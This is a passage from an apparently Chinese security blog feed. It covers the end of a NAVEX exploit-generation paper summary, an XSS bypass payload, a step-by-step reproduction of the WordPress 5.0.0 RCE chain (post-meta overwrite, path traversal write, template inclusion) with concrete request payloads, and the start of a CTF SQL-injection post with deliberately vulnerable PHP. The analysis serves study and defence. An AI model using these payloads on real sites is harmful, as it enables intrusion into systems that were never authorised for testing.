alt="18F43907-0C4A-45B3-9AA5-C2F69FF7D087.png"></p><p>以上是综述，下面将阐述作者从四个方面对NAVEX的评估：1.Exploits；2.定量分析；3.与相关工作的比较；4.限制和讨论</p><h3 id="5-1-Exploits"><a href="#5-1-Exploits" class="headerlink" title="5.1 Exploits"></a>5.1 Exploits</h3><p>接下来作者将对NAVEX针对的漏洞逐一简要说明：</p><p><strong>SQLI漏洞</strong>：<br>漏洞触发点：mssql_query, mysql_query, mysqli_query,sqlite_query<br>漏洞定位：155个SQLI可利用的漏洞点，其运行时间为37分和45秒。<br>Exp生成：105个SQLI漏洞利用Exp，其运行时间为7分和76秒。</p><p><img src="https://i.loli.net/2019/03/11/5c8650aaa28e6.png" alt="D29F0E7F-0DA4-4436-9CBB-6F26672EAA58.png"></p><p><strong>SQLI漏洞利用</strong>：</p><p><img src="https://i.loli.net/2019/03/11/5c8650c83c32d.png" alt="21786D72-6EA2-42F9-BA98-9FCCEC0E3457.png"></p><p><img src="https://i.loli.net/2019/03/11/5c8650ea25570.png" alt="E6C92C6F-A2FF-44E8-B0C2-BE47B6B0D734.png"></p><p><strong>XSS漏洞</strong>：<br>漏洞触发点：echo、print<br>漏洞定位：1小时49分钟内共发现了133个XSS可利用的漏洞点，其中5个是误报<br>Exp生成：40分12秒为133个漏洞点生成了90个XSS漏洞利用</p><p><img src="https://i.loli.net/2019/03/11/5c86510a28218.png" alt="F75221DA-5F90-4EDD-835C-60997FB0304F.png"></p><p><strong>XSS漏洞利用</strong>：如下所示包含strtr函数的路径会被认为是可被攻击的，但是htmlspecialchars的就不会，因为strtr函数对XSS的过滤能力很弱，之后求解器会选择%26%2339%3B-alert(1)-%26%2339%3B来进行绕过。</p><p><img src="https://i.loli.net/2019/03/11/5c86512561ebf.png" alt="13FE3B28-FBD0-482D-B838-9B451F3FABF8.png"></p><p><img src="https://i.loli.net/2019/03/11/5c865140d28c0.png" alt="763D1B5C-B16C-4649-BCD2-0B6E0F793D57.png"></p><p><strong>EAR漏洞</strong>：<br>漏洞触发点：header<br>漏洞定位：17分17秒内发现了19个良性EAR和3个恶意EAR漏洞<br>Exp生成：成功针对22个EAR漏洞生成了9个漏洞利用</p><p><strong>代码执行漏洞</strong>：<br>漏洞触发点：eval<br>漏洞定位：在21m20sec内找到98次调用但是均无安全缺陷</p><p><strong>命令注入漏洞</strong>:<br>漏洞触发点：exec,expect_popen,passthru,pcntl_exec,popen,proc_open,shell_exec,system,mail,backtick_operator<br>漏洞定位：在22m32sec内NAVEX没有找到任何易受影响的漏洞点</p><p><strong>文件包含漏洞</strong>：<br>漏洞触发点：include,include_once,require,require_once<br>漏洞定位：在27分58秒内找到1处接收器内包含了可控变量但是因为后面有约束所以无法构造出Exp，即此处依旧不可利用</p><h3 id="5-2-Measurements"><a href="#5-2-Measurements" class="headerlink" title="5.2 Measurements"></a>5.2 Measurements</h3><ol><li><p>图5显示了NAVEX的性能(定位漏洞点的耗时和构造Exp的耗时)</p><p><img src="https://i.loli.net/2019/03/11/5c865160cea52.png" alt="CF8905E9-7DBB-4F75-B184-56366334D1D0.png"></p></li><li><p>图6显示使用了过滤和DB标签增强的CPG对可能漏洞点判别的影响。(减少了误报)</p></li></ol><p><img src="https://i.loli.net/2019/03/11/5c86517ab78a0.png" alt="DDE0F888-0525-45BB-B7EE-7CB2535C9300.png"></p><ol><li>总覆盖率为68％</li><li>对客户端代码进行分析带来的好处：提升了精度和覆盖率</li></ol><p><img src="https://i.loli.net/2019/03/11/5c86518cbd05f.png" alt="C2F5E466-359A-44AA-B2A4-FF80E50BA855.png"></p><h3 id="5-3-Comparison-with-Related-Work"><a href="#5-3-Comparison-with-Related-Work" class="headerlink" title="5.3 Comparison with Related Work"></a>5.3 Comparison with Related Work</h3><ol><li><p>漏洞检测方面与RIPS，Chainsaw的对比；</p></li><li><p>Exp生成与Chainsaw(只能够对SQLi和XSS生成Exp)的对比；</p></li><li><p>效率方面与Chainsaw的对比：</p></li></ol><p>生成Exp: NAVEX-&gt;25分钟2秒；Chainsaw-&gt;112分钟<br>前期准备: NAVEX-&gt;18分26秒；Chainsaw-&gt;1天13小时21分</p><h3 id="5-4-Limitations-and-Discussion"><a href="#5-4-Limitations-and-Discussion" class="headerlink" title="5.4 Limitations and Discussion"></a>5.4 Limitations and Discussion</h3><ol><li>Web应用程序的某些功能尚不受支持，比如文件上传逻辑；</li><li>自动从图节点导出的TAC公式不完整(未提及哪些不支持)；</li><li>静态分析进行漏洞定位存在误报；</li><li>CPG图不支持解析动态函数调用(文中说这个不太重要但未具体说明，可能是使用极少)；</li><li>如果网站的动态逻辑不被NAVEX支持，那么将无法构造漏洞利用(比如前面的SchoolMate程序的会话维持未被支持&lt;-笔者从文中得到的信息)</li></ol><h2 id="6-Related-Work"><a href="#6-Related-Work" class="headerlink" title="6 Related Work"></a>6 Related Work</h2><p>详细见论文中表述</p><h2 id="7-Conclusions"><a href="#7-Conclusions" class="headerlink" title="7 Conclusions"></a>7 Conclusions</h2><p>PS: 此部分是一些笔者个人的总结并非论文的最终总结</p><p>之前对PHP漏洞的自动化审计工作主要分为静态分析和动态分析。其中静态分析的一些代表的可实际使用的工具有rips、cobra、Cobra-W以及seay代码审计系统，其中rips的建模分析以及攻击字典的构造是比较详细和全面的。虽然可以参考其代码和论文进行学习，但是开源版对现在而言已经不具有实用价值。cobra是基于AST进行分析，AST是具有一定的局限性的，从分析效果上而言没有控制流图好，当然也没有今天提到的CPG好。但是cobra在AST上建立的分析模型以及他对规则集的引入方式是具有一定参考性的。当然在cobra之后的Cobra-W是令人眼前一亮的感觉，虽然还未完全开发完成，但是它对文件包含的处理以及对于自定义过滤函数的处理思想是很值得学习的(相比rips的暴力直接将代码拼接好一些)。seay代码审计系统的优点就是其中包含了对数据库的审计。其它的还有phpvulhunter等工具，但是年代较为久远因而笔者没有对其代码做进一步的分析。在分析过上面的程序之后笔者也曾在一年前尝试引入别名分析等新机制来进一步改善静态分析的准确率，但是效果不是很理想随后就弃坑了。动态分析最具代表性的是prvd，这个笔者还未进行分析，但是用效果不错，感兴趣可以对其进行进一步的分析。</p><p>最后回到本文，此文提出的NAVEX采用静态分析和动态分析相结合的方式，可以自动完成对漏洞的分析并生成Exp。在文中提到的几个方法都是非常新颖的，从效果上来看很不错。如果从工程的角度来看，完全可以借鉴其思想从而进行深入的开发完善。</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>wordpress 5.0.0 RCE分析与复现</title>
      <link href="/2019/03/06/wordpress-5-0-0-rce-aanalysis/"/>
      <url>/2019/03/06/wordpress-5-0-0-rce-aanalysis/</url>
      <content type="html"><![CDATA[<h2 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h2><p>RIPS于2月20日在博客上披露了一个关于WordPress 5.0.0的远程代码执行漏洞。此漏洞由Post Meta变量覆盖、目录穿越写文件、模板包含组合后构成远程代码执行漏洞。</p><h3 id="1-漏洞触发条件"><a href="#1-漏洞触发条件" class="headerlink" title="1.漏洞触发条件"></a>1.漏洞触发条件</h3><p>（1）存在漏洞的wordpress版本如下：<br><a href="https://github.com/WordPress/WordPress/commit/43bdb0e193955145a5ab1137890bb798bce5f0d2" target="_blank" rel="external">WordPress commit \&lt;= 43bdb0e193955145a5ab1137890bb798bce5f0d2 （WordPress 5.1-alpha-44280）</a><br>（2）需要作者权限的账号</p><h3 id="2-漏洞的影响范围"><a href="#2-漏洞的影响范围" class="headerlink" title="2.漏洞的影响范围"></a>2.漏洞的影响范围</h3><p>受影响的wordpress版本为：<br>1.WordPress 5.1-alpha-44280更新后<br>2.未更新的4.9.9~5.0.0的WordPress<br>服务端：windows、linux、mac<br>图片处理库：gd/imagick</p><h2 id="0x01-环境配置"><a href="#0x01-环境配置" class="headerlink" title="0x01 环境配置"></a>0x01 环境配置</h2><p>wordpress在某个版本以后，就增加了自动升级小版本的功能。所以安装好wp以后，需要手工在wp-config.php中加个<code>define(&#39;AUTOMATIC_UPDATER_DISABLED&#39;,true);</code>，禁止其自动更新。</p><p>代码下载最好到对应的<a href="https://cn.wordpress.org/" target="_blank" rel="external">wordpress网站</a>下载，因为官方github release版本都被patch了。此处的分析采用的是从wordpress中文网下载的4.9.4版本代码。</p><p>本文的环境搭建：macOS+php7+wordpress4.9.4+imagick6.9.7</p><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><h3 id="1-Post-Meta变量覆盖"><a href="#1-Post-Meta变量覆盖" class="headerlink" title="1.Post Meta变量覆盖"></a>1.Post Meta变量覆盖</h3><p>此处的漏洞点出现在wordpress 媒体功能在更新被编辑的图片处，我们上传图片之后，图片的保存路径是<code>wp-content/uploads/years/month</code>，同时会在数据库的<code>wp_postmeta</code>表中<code>_wp_attached_file</code>和<code>_wp_attachment_metadata</code>插入对应的值，第一个值是图片的路径+图片名，第二个是图片的相关信息被序列化后的值，具体信息如下图所示。<br><img src="https://i.loli.net/2019/03/03/5c7b439ce5b3c.png" alt="屏幕快照 2019-03-03 上午11.01.17.png"><br>接下来我们定位到此处的漏洞点，在编辑并更新图片的时候会调用edit_post()函数，wp-admin/includes/post.php:187<br><img src="https://i.loli.net/2019/03/03/5c7b4799e13b4.png" alt="屏幕快照 2019-03-03 上午11.18.30.png"><br>从中可以看到该方法的参数来自<code>$_POST</code>,并且此处也没有任何的过滤，在赋值给<code>$post_data</code>之后，被带入到<code>wp_update_post()</code>函数。我们动态调试跟一下这个函数的调用栈。首先我们直接让程序运行到<code>update_post_meta()</code>这个函数，这个函数根据<code>$post_ID</code>修改<code>post meta field</code>，接着调用<code>update_metadata()</code>更新meta数据，完成之后更新post数据。但是在此处并没有对post的数据进行过滤，我们的<code>$post_data[&quot;meta_input&quot;][&quot;_wp_attached_file&quot;]</code>的值也没有被过滤掉。<br><img src="https://i.loli.net/2019/03/03/5c7b5cab0f798.png" alt="屏幕快照 2019-03-03 下午12.48.07.png"><br>我们继续跟进<code>wp_update_post()</code>函数，点击步进后进入<code>wp_update_post()</code>函数，wp-includes/post.php:3611<br><img src="https://i.loli.net/2019/03/03/5c7b5f1b5cdf7.png" alt="屏幕快照 2019-03-03 下午12.57.47.png"><br>我们可以看到在这个函数的末尾处，如果post_type的值是attachment类型就会调用<code>wp_insert_attachment()</code>函数，wp-includes/post.php:4898。<br><img src="https://i.loli.net/2019/03/03/5c7b606a0a0e3.png" alt="屏幕快照 2019-03-03 下午1.04.31.png"><br>我们继续步进跟一下这个函数，可以看到它接着调用了<code>wp_insert_post()</code>函数，wp-includes/post.php:3044<br>在第3434行可以看到对于meta_input参数，此处遍历传入<code>update_post_meta()</code>函数，我们继续跟进。<br><img src="https://i.loli.net/2019/03/03/5c7b630b3a4cc.png" alt="屏幕快照 2019-03-03 下午1.15.42.png"><br><code>update_post_meta()</code>函数，wp-includes/post.php:1799<br>发现其中调用了<code>update_metadata()</code>函数来做进一步的处理，跟进后发现<code>update_metadata()</code>使用来将数据库中对应的键值进行更新操作，而且在这个过程中没有对<code>meta_input</code>的值做任何的过滤，所以我们可以传入指定的 key 来设置它的值。<br><img src="https://i.loli.net/2019/03/03/5c7b703fb6665.png" alt="屏幕快照 2019-03-03 下午2.11.11.png"><br><img src="https://i.loli.net/2019/03/03/5c7b71445620f.png" alt="屏幕快照 2019-03-03 下午2.16.24.png"><br>在此我们回顾一下这个调用栈<br><img src="https://i.loli.net/2019/03/03/5c7b7228a57e9.png" alt="屏幕快照 2019-03-03 下午2.20.10.png"><br>因此我们构造POST数据包就可以覆盖掉<code>_wp_attached_file</code>的值，覆盖效果及操作如下所示：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#将这个附加到POST数据后</span></div><div class="line">&amp;meta_input[_wp_attached_file]=2019/03/z3r0yu.jpg?/../../../../themes/z3r0yu.jpg</div></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/03/5c7b735ce8c23.png" alt="屏幕快照 2019-03-03 下午2.24.01.png"><br><img src="https://i.loli.net/2019/03/03/5c7b735cdc061.png" alt="屏幕快照 2019-03-03 下午2.24.34.png"><br><img src="https://i.loli.net/2019/03/03/5c7b735cdcbbd.png" alt="屏幕快照 2019-03-03 下午2.25.13.png"><br>到此为止第处漏洞点的分析利用已经完成，漏洞触发最重要原因就是没有做好过滤，因此该处的补丁为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">array_diff_key( $post_data, array_flip( <span class="keyword">array</span>( <span class="string">'meta_input'</span>, <span class="string">'file'</span>, <span class="string">'guid'</span> ) ) );</div></pre></td></tr></table></figure></p><p>从补丁上可以看到对<code>meta_input</code>做了过滤(PS:你下载的代码中要是出现这个就说明是被patch过了)。</p><h3 id="2-目录穿越造成文件写入"><a href="#2-目录穿越造成文件写入" class="headerlink" title="2.目录穿越造成文件写入"></a>2.目录穿越造成文件写入</h3><p>该问题是建立在之前我们Post Meta变量覆盖漏洞之上的。因为在之前我们是可以在<code>_wp_attached_file</code>处写入任意值的，因此只需要一个方法将我们写入的值进行利用一下就好。<br>在wordpress的图片裁剪功能中，可以实现本地文件读取和远程文件读取。但是远程文件读取这个位置很有意思，如果目标图片在该目录不存在，则通过<strong>本地服务器</strong>下载该图片，如从<code>http://127.0.0.1/wp494/wp-content/uploads/2019/03/2233.jpg</code>下载，裁剪后重新保存。此处我们可以构造一个带参数的url，比如<code>http://127.0.0.1/wp494/wp-content/uploads/2019/03/2233.jpg?z3r0yu</code>，在远程读取的时候会忽略?号之后的内容，从而只对2233.jpg进行剪切后保存。目录穿越问题就存在于此，如果我们构造如下所示的url<code>http://127.0.0.1/wp494/wp-content/uploads/2019/03/2233.jpg?/../../../../themes/twentysixteen/z3r0yu.jpg</code>，wordpress将裁减后的图片保存至<code>wp-content/themes/twentysixteen/</code>目录下，如果图片中包含恶意代码就可能被进一步的利用。</p><p>编辑图片会先调用<code>do_action</code>通过<code>apply_filters()</code>函数进入<code>wp_ajax_crop_image()</code>函数，在wp-admin/includes/ajax-actions.php:3224<br><img src="https://i.loli.net/2019/03/03/5c7b9d181c1cb.png" alt="屏幕快照 2019-03-03 下午5.23.22.png"><br>在函数中首先会调用<code>check_ajax_referer()</code>函数来对用户的权限进行校验，之后调用<code>absint()</code>函数将<code>$_POST[&#39;cropDetails&#39;]</code>的值转换为非负值，之后将参数传入<code>wp_crop_image()</code>函数对图片进行剪裁操作，wp-admin/includes/image.php:25。(PS:你如果想要动态调试经过这一步就要满足上面那些条件)<br><img src="https://i.loli.net/2019/03/03/5c7bb5457da91.png" alt="屏幕快照 2019-03-03 下午7.06.33.png"><br>从数据库取出<code>_wp_attached_file</code>后并没有任何过滤，所以我们之前设置的值在此处已经是完好的，如下图所示。<br><img src="https://i.loli.net/2019/03/03/5c7bb6ca40804.png" alt="屏幕快照 2019-03-03 下午7.12.06.png"><br>只有依据<code>_wp_attached_file</code>的值做了判断，发现文件不存在开始去调用<code>_load_image_to_edit_path()</code>函数，我们进行跟进，wp-admin/includes/image.php:649<br><img src="https://i.loli.net/2019/03/03/5c7bb7f48c935.png" alt="屏幕快照 2019-03-03 下午7.18.02.png"><br>继续跟进后发现调用了<code>wp_get_attachment_url()</code>来拼接url链接。<br><img src="https://i.loli.net/2019/03/03/5c7bbc01d72a8.png" alt="屏幕快照 2019-03-03 下午7.35.18.png"><br><img src="https://i.loli.net/2019/03/03/5c7bbc6c0e928.png" alt="屏幕快照 2019-03-03 下午7.37.06.png"><br>之后上面拼接的url链接传输到<code>wp_get_image_editor()</code>函数中，我们步进跟一下这个函数，wp-includes/media.php:2900<br><img src="https://i.loli.net/2019/03/03/5c7bbd7ce4a66.png" alt="屏幕快照 2019-03-03 下午7.41.33.png"><br>跟进后发现其中调用了<code>_wp_image_editor_choose()</code>函数，继续跟进，wp-includes/media.php:2950<br><img src="https://i.loli.net/2019/03/03/5c7bbe5529943.png" alt="屏幕快照 2019-03-03 下午7.45.15.png"><br>从这里可以看到Wordpress提供了两种方式来处理图片，优先使用Imagick，之后是GD。我们在此要特别注意，这俩对图片的处理方式是不同的：</p><ol><li>Imagick不会去除掉图片中的exif部分，所以我们可以将待执行payload代码加入到exif部分。</li><li>GD会去除图片的exif部分，并且其中的phpcode很难存活。除非通过精心构造一张图片才可以。</li></ol><p>我在此只谈复现分析，暂时不谈对图片的Fuzz，因此选择Imagick库。</p><p>PS:Imagick处理类的load函数中调用的是readImage函数，但在高版本的Imagick上该函数不支持远程图片链接，因此最好采用Imagick-6.9.7及其以下版本。</p><p>完成图片剪裁后就再次进入<code>wp_crop_image()</code>函数中，<code>$dst_file</code>的值是文件名，因此最终路径如下图所示：<br><img src="https://i.loli.net/2019/03/03/5c7bc18c8f840.png" alt="屏幕快照 2019-03-03 下午7.55.15.png"></p><p>之后就是未经任何过滤进入到<code>wp_mkdir_p()</code>函数来创建目录，我们继续跟进后发现其中也没有任何过滤，直接执行到<code>mkdir()</code>进行目录创建，此时<code>$target</code>的值如下所示:<br><img src="https://i.loli.net/2019/03/03/5c7bd1ce0e1dc.png" alt="屏幕快照 2019-03-03 下午9.08.19.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$target:&quot;/Applications/XAMPP/xamppfiles/htdocs/wp494/wp-content/uploads/2019/03/z3r0yu.jpg?/../../../../themes&quot;</div></pre></td></tr></table></figure><p>创建完路径之后，调用<code>save()</code>对图片进行保存，我们单步跟进<code>save()</code>函数，wp-includes/class-wp-image-editor-gd.php:364</p><p><img src="https://i.loli.net/2019/03/03/5c7bd4fbcab7c.png" alt="屏幕快照 2019-03-03 下午9.21.40.png"><br>在<code>save()</code>中调用了<code>make_image()</code>函数，继续跟进到wp-includes/class-wp-image-editor.php:394<br><img src="https://i.loli.net/2019/03/03/5c7bd4fbc8a3f.png" alt="屏幕快照 2019-03-03 下午9.21.10.png"><br>此处会用<code>call_user_func_array</code>函数来调用Imagick的<code>writeImage</code>函数，并将<code>$filename</code>传递进去，但是在Linux平台上此函数是不支持不存在的目录跳转的。我们的<code>z3r0yu.jpg?/</code>在这里就是不存在目录，这个函数如果被调用就会抛出错误，从而无法达到任意写的目的。如果想进行绕过只需要多次上传裁剪就可以。</p><p>接下来我们对此部分进行利用，我们接着Post Meta变量覆盖的利用之后进行，使用wordpress的剪切功能并在剪切完保存图片的时候进行burp抓包并将要POST的数据修改如下（PS:_ajax_nonce和id的值要与之前保持一致）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">action=crop-image&amp;_ajax_nonce=0810f2d564&amp;id=10&amp;cropDetails[x1]=10&amp;cropDetails[y1]=10&amp;cropDetails[width]=10&amp;cropDetails[height]=10&amp;cropDetails[dst_width]=100&amp;cropDetails[dst_height]=100</div></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/03/5c7b8d4c08a1e.png" alt="屏幕快照 2019-03-03 下午4.11.54.png"><br>最终会在我们指定的目录下生成剪裁后的图片<br><img src="https://i.loli.net/2019/03/03/5c7b8d4bca96e.png" alt="屏幕快照 2019-03-03 下午4.12.09.png"><br>既然可以成功在指定目录下写入图片文件，那么我们完全可以构造一个包含有shell的图片。但是文件只能是jpg，所以我们还需要结合本地文件包含做进一步的利用。</p><p>小结：此部分我们将POST的数据进行了修改，目的是修改<code>action</code>为<code>crop-image</code>达到触发存在漏洞的<code>wp_crop_image()</code>函数。</p><h3 id="3-本地文件包含-模板功能"><a href="#3-本地文件包含-模板功能" class="headerlink" title="3.本地文件包含(模板功能)"></a>3.本地文件包含(模板功能)</h3><p>之前的工作我们已经达到了任意文件写入的目的，如果想对图片中的代码进行利用，我们必须结合本地文件包含漏洞。此处我们已经预先知道了文件包含点在wordpress的模板位置，它会根据需要加载的页面类型从当前主题下选择需要的模板，如果存在就会被包含。因此我们在此处主要关注与模板包含相关的函数。</p><p>之前我在数据库中关注到一个<code>_wp_page_template</code>字段，而在wordpress中模板文件位置就是存储在数据库中。详查一下发现加载页面所需要的模板文件存储就在wp_postmeta数据库中的<code>_wp_page_template</code>,这个值默认是<code>default</code>。</p><p>所以我们先查看一下这个值的使用位置，可以看到在<code>get_post_meta()</code>函数中对这个值进行了取出，wp-includes/post-template.php:1683。<br><img src="https://i.loli.net/2019/03/04/5c7d1e809b7bb.png" alt="屏幕快照 2019-03-04 下午8.47.22.png"><br><img src="https://i.loli.net/2019/03/04/5c7d1ee1c4d05.png" alt="屏幕快照 2019-03-04 下午8.49.12.png"><br>继续全局检索一些<code>get_page_template_slug()</code>函数的引用位置，可以看到在与模板相关的wp-includes/template.php文件中进行了调用。<br><img src="https://i.loli.net/2019/03/04/5c7d2301373ad.png" alt="屏幕快照 2019-03-04 下午9.05.45.png"><br>继续看代码，发现只有两个函数对<code>get_page_template_slug()</code>进行了调用，第一个是<code>get_page_template()</code>函数，wp-includes/template.php:405；第二个是<code>get_single_template()</code>函数，wp-includes/template.php:481<br><img src="https://i.loli.net/2019/03/04/5c7d2387e1958.png" alt="屏幕快照 2019-03-04 下午9.09.08.png"><br><img src="https://i.loli.net/2019/03/04/5c7d291bc8c07.png" alt="屏幕快照 2019-03-04 下午9.33.05.png"><br>我们继续看一下<code>get_single_template()</code>函数，看到在 <code>get_page_template_slug()</code>取值之后赋值给了<code>$template</code>，之后<code>$template</code>经过简单的判断后赋值给<code>$templates[]</code>，最终<code>$templates</code>变量传入<code>get_query_template()</code>函数，我们继续跟进一下个函数，wp-includes/template.php:23<br><img src="https://i.loli.net/2019/03/04/5c7d2a49216ad.png" alt="屏幕快照 2019-03-04 下午9.38.00.png"><br>从这段代码中我们可以看到<code>$templates</code>变量的值又传入了<code>locate_template()</code>函数，继续跟进这个函数，wp-includes/template.php:629</p><p><img src="https://i.loli.net/2019/03/04/5c7d2ba474915.png" alt="屏幕快照 2019-03-04 下午9.43.55.png"><br>从代码中可以看到可控的变量<code>$template_name</code>值经过拼接和判断处理，因此我们结合之前的目录穿越造成的任意文件写入问题，我们需要将新生成的图片放到<code>theme-compat</code>目录下。</p><p>分析完加载的路径上的文件是我们可控之后，我们查看下载何处调用了<code>get_single_template()</code>函数，并且对其返回的变量做了何种处理。从下图中的代码，我们可以看到在74行使用<code>include</code>对<code>$template</code>变量返回的值进行了包含，从而可以造成任意代码执行。<br><img src="https://i.loli.net/2019/03/04/5c7d2d7995446.png" alt="屏幕快照 2019-03-04 下午9.51.43.png"></p><h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p>首先上传一张图片，点击更新按钮抓包<br><img src="https://i.loli.net/2019/03/05/5c7e908b900bf.png" alt="屏幕快照 2019-03-05 下午11.05.31.png"><br>在数据包中添加如下信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&amp;meta_input[_wp_attached_file]=2019/03/2233.jpg?/../../../../themes/twentysixteen/z3r0yu.jpg</div></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/05/5c7e93abcd42f.png" alt="屏幕快照 2019-03-05 下午11.19.19.png"><br>可以看到数据库中已经成功保存了我们设置的值<br><img src="https://i.loli.net/2019/03/05/5c7e93ac8bfe4.png" alt="屏幕快照 2019-03-05 下午11.19.52.png"><br>接下来对图片进行剪裁，并抓包<br><img src="https://i.loli.net/2019/03/05/5c7e942d0eb99.png" alt="屏幕快照 2019-03-05 下午11.22.09.png"><br>修改数据包内容如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">action=crop-image&amp;_ajax_nonce=1cc3d57951&amp;id=15&amp;cropDetails[x1]=10&amp;cropDetails[y1]=10&amp;cropDetails[width]=10&amp;cropDetails[height]=10&amp;cropDetails[dst_width]=100&amp;cropDetails[dst_height]=100</div></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/05/5c7e94ea63e5b.png" alt="屏幕快照 2019-03-05 下午11.24.35.png"><br>最终我们可以看到图片已经在对应的路径下了<br><img src="https://i.loli.net/2019/03/05/5c7e94e8b649b.png" alt="屏幕快照 2019-03-05 下午11.24.58.png"><br>接下来进行文件包含，我们选择上传一个rce.txt，然后再次修改信息，与最初的方式一样，此处加上如下的键值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&amp;meta_input[_wp_page_template]=cropped-z3r0yu.jpg</div></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/05/5c7e965ac7b1f.png" alt="屏幕快照 2019-03-05 下午11.30.36.png"><br><img src="https://i.loli.net/2019/03/05/5c7e96422d642.png" alt="屏幕快照 2019-03-05 下午11.31.00.png"><br>可以看懂数据库中已经对应的值已经修改<br><img src="https://i.loli.net/2019/03/05/5c7e96c489671.png" alt="屏幕快照 2019-03-05 下午11.33.10.png"><br>最终成功RCE<br>(PS:此处有个小坑，如果你要是访问附件出现了404，那么设置一下固定连接即可)<br><img src="https://i.loli.net/2019/03/06/5c7ea650cf4c9.png" alt="屏幕快照 2019-03-06 上午12.39.16.png"></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>这个漏洞的分析和环境搭建的过程中坑点不少，先对坑点做一个小结：</p><ol><li>wordpress自动更新处理，在wp-config.php中加如一行代码<code>define(&#39;AUTOMATIC_UPDATER_DISABLED&#39;,true);</code>来禁止更新。</li><li>Imagick和GD对图片的处理方式不同的问题，对GD的利用需要Fuzz出paylaod，Imagick直接修改exif部分即可。</li><li>Windows 下的目录不能含有?，因此最好采用#。</li><li>Linux下由于xxx.jpg#是个不存在的目录，因此调用Imagick的<code>writeImage</code>函数会调用失败抛出错误终止流程，进而无法达成第二个漏洞的利用，但是看到balisong师傅借助多次上传裁剪来绕过这个坑点(目前笔者还未成功对此测试成功)。</li><li>官网的所以release版本都修复了这个漏洞。</li><li>固定连接设置问题，默认配置下查看附件会出现404。</li></ol><p>漏洞构成思路总结：首先是一个变量覆盖，将我们需要的<code>../</code>引入数据库；之后是一个剪裁图片功能未对变量内容进行审查造成目录穿越写文件；最后是模板参数处理过程中的一个本地文件包含漏洞，最终构成RCE。每个漏洞独立出来危害都极低，但是组合后却可以导致RCE的出现，此攻击链的构造十分精妙。</p><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/" target="_blank" rel="external">《WordPress 5.0.0 Remote Code Execution》–Simon Scannell</a><br><a href="https://paper.seebug.org/822/" target="_blank" rel="external">《WordPress 5.0 RCE 详细分析》–LoRexxar’</a><br><a href="https://mp.weixin.qq.com/s/9DMGLOvFJUjq8MaMr9eg6A" target="_blank" rel="external">《Wordpress 5.0.0远程代码执行漏洞分析与复现》–balisong</a><br><a href="https://kylingit.com/blog/wordpress-image-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="external">《WORDPRESS IMAGE 远程代码执行漏洞分析》–诗与胡说</a><br><a href="https://www.leavesongs.com/other/tinger.html" target="_blank" rel="external">《Wordpress \&lt; 4.1.2 存储型XSS分析与稳定POC》–phithon</a></p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>CTF中的SQLi</title>
      <link href="/2018/11/24/SQLi-in-CTF/"/>
      <url>/2018/11/24/SQLi-in-CTF/</url>
      <content type="html"><![CDATA[<h2 id="0x01-http头xff的时间盲注"><a href="#0x01-http头xff的时间盲注" class="headerlink" title="0x01 http头xff的时间盲注"></a>0x01 http头xff的时间盲注</h2><p>题目代码如下，从题目分析可以看到$ip是从xxf参数中获取的，并再使用explode函数处理后(注意在这里使用了,号作为分隔符，因而我们插入的sql语句中不能出现,号了)，直接代入sql语句，因而是存在sql注入漏洞。因为关闭了报错，因而只能采用时间盲注的方式。</p><p>因为,号不能使用，所以就意味着limit 0,1不能使用，但是可以使用from 0 for 1进行代替；if判断在此处不能使用了，但是可以使用select case when（满足条件）then（语句1）else（语句2） end语句进行代替</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span><span class="params">()</span></span>&#123;</div><div class="line">$ip = <span class="string">''</span>;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</div><div class="line">$ip = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</div><div class="line">&#125;</div><div class="line">$ip_arr = explode(<span class="string">','</span>, $ip);</div><div class="line"><span class="keyword">return</span> $ip_arr[<span class="number">0</span>];</div><div 